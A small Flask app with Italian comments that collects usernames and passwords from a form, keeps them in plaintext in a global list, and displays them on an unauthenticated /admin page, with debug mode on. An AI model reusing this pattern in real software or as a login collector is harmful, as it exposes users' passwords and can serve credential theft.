from flask import Flask, render_template, request

app = Flask(__name__, template_folder='templates')

# Variabile per salvare i dati temporaneamente
dati_inseriti = []

@app.route('/')
def home():
    return render_template('pagina1.html')

@app.route('/pagina2', methods=['POST'])
def pagina2():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Salva i dati nella lista globale
    dati_inseriti.append({'username': username, 'password': password})

    return "✅ Dati ricevuti con successo!"

@app.route('/admin')
def admin():
    return render_template('pagina2.html', dati=dati_inseriti)

if __name__ == '__main__':
    print("✅ Flask sta partendo correttamente...")
    app.run(debug=True, port=5000)
